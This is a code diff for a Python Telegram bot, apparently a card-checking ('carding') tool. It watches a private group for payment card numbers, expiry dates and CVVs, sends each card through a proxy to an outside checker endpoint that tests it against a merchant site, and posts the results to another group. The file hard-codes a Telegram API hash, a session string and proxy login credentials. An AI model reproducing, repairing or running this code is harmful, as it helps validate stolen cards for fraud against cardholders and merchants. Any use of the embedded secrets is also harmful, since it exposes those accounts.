@@ -13,20 +13,19 @@ from typing import Optional, Set, Dict
 logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
 logger = logging.getLogger("droper")
 
-# Replace with your real credentials
 api_id = 17455551
 api_hash = "abde39d2fad230528b2695a14102e76a"
 SESSION_STRING = "1BVtsOLwBu6ENhB2xUwqQMeRb6FQoytffPpwMLt-CwrOa3uq6NQlpb3nN4nIByzoDeWalXRhiZaiRbdCqCOHWG3mfsFZcw_YijQUdLK7rdS-5AXRsY5oQdKACOoiHgtslVac2_wNCL6MA_UUhU5orRzaV7kkBtimv6XY6y-9yab4SlrUsxafzOjhqfhDRfX-stkrHgp9_wwOMYheTnUbzMkRsQnjAFLsd-AuuVkXdTPI1HoPzDzRVma_7ysD8K4fNaO2VWYoQQ0yM3-jcRGpGELYARrTz6AvVLSaosypQPGX_B-ukh1CJc_2hVKxz3FgxCiP6md1rMlzQujNB6ejl20L0_2P-yf4="
 
-PRIVATE_GROUP_ID = -1002682944548   # Listen for cards here
-TARGET_GROUP_ID = -1002968335063    # Drop results here
+PRIVATE_GROUP_ID = -1002682944548
+TARGET_GROUP_ID = -1002968335063
 ADMIN_ID = 8493360284
 
 API_URL = "https://autosh.arpitchk.shop/puto.php"
 SITE = "https://jasonwubeauty.com"
 PROXIES = ["45.41.172.51:5794:juftilus:atasaxde44jl"]
 
-NUM_CONCURRENT = 5  # concurrent API requests
+NUM_CONCURRENT = 5
 GLOBAL_DEDUPE_SECONDS = 60 * 30  # 30 min dedupe window
 
 # ---------------- CLIENT & STATE ----------------
@@ -35,7 +34,7 @@ session: Optional[aiohttp.ClientSession] = None
 semaphore = asyncio.Semaphore(NUM_CONCURRENT)
 _in_progress: Set[str] = set()
 _recent_processed: Dict[str, float] = {}
-_target_entity = None  # will resolve at startup
+_target_entity = TARGET_GROUP_ID  # use numeric ID directly
 
 # ---------------- REGEX (multiple formats) ----------------
 SIMPLE_REGEX = re.compile(
@@ -141,23 +140,25 @@ async def on_new_msg(event):
     if not text.strip():
         return
     for pat in PATTERNS:
-        for m in pat.finditer(text):
-            gd = m.groupdict()
-            if gd:
-                cc = gd.get("cc") or gd.get("t1")
-                mm = gd.get("mm") or gd.get("t2")
-                yy = gd.get("yy") or gd.get("t3")
-                cvv = gd.get("cvv") or gd.get("t4")
+        m = pat.search(text)
+        if not m:
+            continue
+        gd = m.groupdict()
+        if gd:
+            cc = gd.get("cc") or gd.get("t1")
+            mm = gd.get("mm") or gd.get("t2")
+            yy = gd.get("yy") or gd.get("t3")
+            cvv = gd.get("cvv") or gd.get("t4")
+        else:
+            groups = m.groups()
+            if len(groups) >= 4:
+                cc, mm, yy, cvv = groups[0], groups[1], groups[2], groups[3]
             else:
-                groups = m.groups()
-                if len(groups) >= 4:
-                    cc, mm, yy, cvv = groups[0], groups[1], groups[2], groups[3]
-                else:
-                    continue
-            token = build_token(cc, mm, yy, cvv)
-            if token and token not in _recent_processed and token not in _in_progress:
-                asyncio.create_task(process_card(token))
-                logger.info("Scheduled card %s from message %s", token, event.id)
+                continue
+        token = build_token(cc, mm, yy, cvv)
+        if token and token not in _recent_processed and token not in _in_progress:
+            asyncio.create_task(process_card(token))
+            logger.info("Scheduled card %s from message %s", token, event.id)
 
 # ---------------- ADMIN COMMANDS ----------------
 dropping_enabled = True
@@ -175,17 +176,20 @@ async def admin_handler(event):
         await event.reply("⏹ Dropping disabled.")
     elif txt == "/status":
         await event.reply(f"✅ dropping: {dropping_enabled}\nrecent tokens: {len(_recent_processed)}")
+    else:
+        return
 
 # ---------------- STARTUP ----------------
 async def main():
-    global session, _target_entity
+    global session
     session = aiohttp.ClientSession()
-    _target_entity = await client.get_entity(TARGET_GROUP_ID)
-    asyncio.create_task(_cleanup_recent_task())
-    logger.info("Listening for messages in %s", PRIVATE_GROUP_ID)
-    await client.start()
-    await client.run_until_disconnected()
-    await session.close()
+    try:
+        await client.start()
+        asyncio.create_task(_cleanup_recent_task())
+        logger.info("✅ Client started. Listening for messages in %s", PRIVATE_GROUP_ID)
+        await client.run_until_disconnected()
+    finally:
+        await session.close()
 
 if __name__ == "__main__":
     try:
